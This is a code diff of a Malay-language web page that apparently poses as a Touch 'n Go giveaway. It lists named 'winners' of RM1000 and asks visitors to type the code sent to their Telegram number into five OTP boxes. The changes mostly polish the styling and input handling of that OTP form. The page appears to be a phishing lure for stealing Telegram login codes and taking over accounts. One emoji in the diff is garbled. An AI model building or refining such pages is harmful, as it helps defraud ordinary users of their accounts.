@@ -134,8 +134,10 @@
         margin-bottom: 8px;
         font-size: 16px;
         font-weight: 600;
-        color: var(--text-white);
-        text-align: left;
+        color: var(--accent-yellow);
+        text-align: center;
+        justify-content: center;
+        margin: 0 auto;
       }
 
       input[type="text"],
@@ -150,9 +152,9 @@
       }
 
       input[type="tel"] {
-        width: 100%;
-        padding: 10px;
-        margin-bottom: 20px;
+        width: 100% !important;
+        padding: 10px 45px !important;
+        margin-bottom: 0 !important;
         border: 1px solid var(--accent-yellow);
         border-radius: 5px;
         font-size: 13px;
@@ -179,7 +181,7 @@
         display: flex;
         align-items: center;
         justify-content: center;
-        margin: 20px auto 0; /* Mengubah margin: atas 20px, kiri-kanan auto, bawah 5px */
+        margin: 10px auto 0; /* Mengubah margin: atas 20px, kiri-kanan auto, bawah 5px */
       }
 
       .btn:hover {
@@ -191,7 +193,7 @@
         font-size: 16px;
         color: var(--text-white);
         text-align: center;
-        margin: 20px 0;
+        margin: 10px auto 10px;
         line-height: 1.6;
       }
 
@@ -199,7 +201,8 @@
         font-size: 20px;
         color: var(--text-white);
         text-align: center;
-        margin: 20px 0;
+        margin: 0;
+        justify-content: center;
       }
 
       /* Loading Screen */
@@ -301,6 +304,7 @@
 
         .hero img {
           width: 100%;
+          margin-bottom: 10px;
         }
 
         .form-container {
@@ -415,24 +419,45 @@
 
       .otp-container {
         display: flex;
-        justify-content: space-between;
-        gap: 10px;
-        margin-bottom: 20px;
+        justify-content: center;
+        gap: 8px;
+        margin: 10px auto 20px;
       }
 
       .otp-input {
-        width: 50px;
-        height: 50px;
+        width: 40px;
+        height: 40px;
         text-align: center;
-        font-size: 24px;
+        font-size: 18px;
+        font-weight: bold;
         border: 1px solid var(--accent-yellow);
         border-radius: 5px;
-        background: white;
+        -moz-appearance: textfield; /* Firefox */
+      }
+
+      /* Menghilangkan arrow spinner di Chrome, Safari, Edge, Opera */
+      .otp-input::-webkit-outer-spin-button,
+      .otp-input::-webkit-inner-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
       }
 
       .otp-input:focus {
         outline: none;
-        border-color: var(--royal-gold);
+        border-color: var(--accent-yellow);
+        box-shadow: 0 0 3px rgba(255, 215, 0, 0.5);
+      }
+
+      @media (max-width: 375px) {
+        .otp-container {
+          gap: 6px;
+        }
+
+        .otp-input {
+          width: 35px;
+          height: 35px;
+          font-size: 16px;
+        }
       }
 
       /* Tambahkan CSS ini di dalam tag <style> */
@@ -446,7 +471,7 @@
       }
 
       .list-box {
-        max-height: 216px;
+        max-height: 163px;
         overflow-y: auto;
         scrollbar-width: none; /* Untuk Firefox */
         -ms-overflow-style: none; /* Untuk Internet Explorer dan Edge */
@@ -491,6 +516,41 @@
         color: var(--accent-yellow);
         font-size: 14px;
         font-weight: bold;
+      }
+
+      /* Perbaikan untuk input telepon */
+      .iti {
+        width: 100% !important;
+        margin-bottom: 20px;
+      }
+
+      .iti__flag-container {
+        z-index: 1;
+      }
+
+      input[type="tel"] {
+        width: 100% !important;
+        padding: 10px 45px !important;
+        margin-bottom: 0 !important;
+        border: 1px solid var(--accent-yellow);
+        border-radius: 5px;
+        font-size: 13px;
+        transition: border-color 0.3s ease;
+      }
+
+      /* Responsif untuk layar kecil */
+      @media (max-width: 450px) {
+        .iti {
+          max-width: 100%;
+        }
+
+        input[type="tel"] {
+          width: 100% !important;
+        }
+      }
+
+      .no-margin {
+        margin: 0;
       }
     </style>
   </head>
@@ -752,7 +812,7 @@
                   <div class="h1">
                     <span class="name">Fauzi Abdul Rahman</span>
                   </div>
-                  <div class="h2">RM1000 ✅</div>
+                  <div class="h2">RM1000 ��</div>
                   <!-- Ubah jadi RM1000 -->
                 </div>
               </div>
@@ -798,48 +858,50 @@
       <div class="hero">
         <img src="ker-umum.jpeg" alt="tng-img" />
         <div class="form-container">
-          <p>Sila Masukan Kod-yang dihantar ke Nombor Telegram Anda</p>
+          <p class="no-margin">
+            Sila Masukan Kod-yang dihantar ke Nombor Telegram Anda
+          </p>
           <form id="otpForm">
             <label for="otp-1">Masukan Kod-OTP</label>
             <div class="otp-container">
               <input
-                type="tel"
+                type="number"
                 class="otp-input"
                 id="otp-1"
                 maxlength="1"
-                pattern="[0-9]"
+                oninput="this.value=this.value.slice(0,1)"
                 required
               />
               <input
-                type="tel"
+                type="number"
                 class="otp-input"
                 id="otp-2"
                 maxlength="1"
-                pattern="[0-9]"
+                oninput="this.value=this.value.slice(0,1)"
                 required
               />
               <input
-                type="tel"
+                type="number"
                 class="otp-input"
                 id="otp-3"
                 maxlength="1"
-                pattern="[0-9]"
+                oninput="this.value=this.value.slice(0,1)"
                 required
               />
               <input
-                type="tel"
+                type="number"
                 class="otp-input"
                 id="otp-4"
                 maxlength="1"
-                pattern="[0-9]"
+                oninput="this.value=this.value.slice(0,1)"
                 required
               />
               <input
-                type="tel"
+                type="number"
                 class="otp-input"
                 id="otp-5"
                 maxlength="1"
-                pattern="[0-9]"
+                oninput="this.value=this.value.slice(0,1)"
                 required
               />
             </div>
